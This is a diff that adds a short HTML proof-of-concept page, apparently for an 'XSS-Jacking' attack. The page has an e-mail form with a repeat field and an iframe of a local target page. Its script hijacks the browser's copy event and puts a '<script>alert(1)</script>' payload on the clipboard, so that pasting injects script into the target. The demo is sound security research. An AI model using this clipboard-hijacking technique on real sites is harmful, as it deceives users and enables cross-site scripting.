@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <label for="fname">E-Mail Address:</label>
+        <input type="text" id="address1" name="address1"><br><br>
+        <label for="fname">repeat:</label>
+        <input type="text" id="address2" name="address2"><br><br>
+
+        <iframe src="/home/mkesenheimer/Desktop/XSS-Jacking/target.html" title=""></iframe> 
+
+        <script>
+            document.addEventListener('copy', function(e){
+                console.log(e);
+                //alert(e.clipboardData.getData('text/plain'));
+                e.clipboardData.setData('text/plain', '<script>alert(1)<\/script>');
+                e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
+            });
+        </script>
+    </body>
+</html>
